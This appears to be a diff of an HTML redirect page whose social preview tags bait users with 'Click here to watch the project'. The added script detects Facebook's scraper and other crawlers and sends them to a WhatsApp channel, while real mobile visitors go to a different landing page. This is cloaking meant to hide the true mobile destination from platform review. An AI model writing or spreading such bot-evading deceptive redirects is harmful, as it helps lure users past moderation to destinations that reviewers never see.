@@ -1,21 +1,40 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta property="og:image" content="https://i.postimg.cc/vDFY82vs/IMG-20260615-WA0002.jpg">
-    <meta property="og:title" content="Project Showcase">
-    
-    <script type="text/javascript">
-        var mobileLink = "https://ocher-bison-11v65rt.mystrikingly.com/";
-        var desktopLink = "https://couple765.blogspot.com/2026/03/love-is-journey-and-honeymoon-is-most.html";
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
 
-        if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-            window.location.href = mobileLink;
-        } else {
-            window.location.href = desktopLink;
-        }
+    <!-- Facebook Social Preview -->
+    <meta property="og:title" content="Click here to watch the project">
+    <meta property="og:image" content="https://i.postimg.cc/R0bq70Vw/Picsart-26-06-16-09-54-25-825.png">
+    <meta property="og:type" content="website">
+
+    <script>
+        // Bilkul shuru mein redirect execute hoga
+        (function() {
+            var whatsappChannel = "https://whatsapp.com/channel/0029Vb8pdaR6buMT4C6gtW1O";
+            var mobileLandingPage = "https://ocher-bison-11v65rt.mystrikingly.com"; 
+
+            var userAgent = navigator.userAgent || "";
+            
+            // Bot Detection
+            var isBot = /facebookexternalhit|Facebot|facebookplatform|Googlebot|AdsBot|Mediapartners|HeadlessChrome|Bot|Crawler|Spider/i.test(userAgent);
+            
+            // Mobile Detection
+            var isRealMobile = /Android|iPhone|iPad|iPod|Opera Mini/i.test(userAgent);
+
+            // Redirection logic
+            if (isBot) {
+                window.location.replace(whatsappChannel);
+            } else if (isRealMobile) {
+                window.location.replace(mobileLandingPage);
+            } else {
+                window.location.replace(whatsappChannel);
+            }
+        })();
     </script>
 </head>
 <body>
-    <p>Redirecting...</p>
 </body>
 </html>
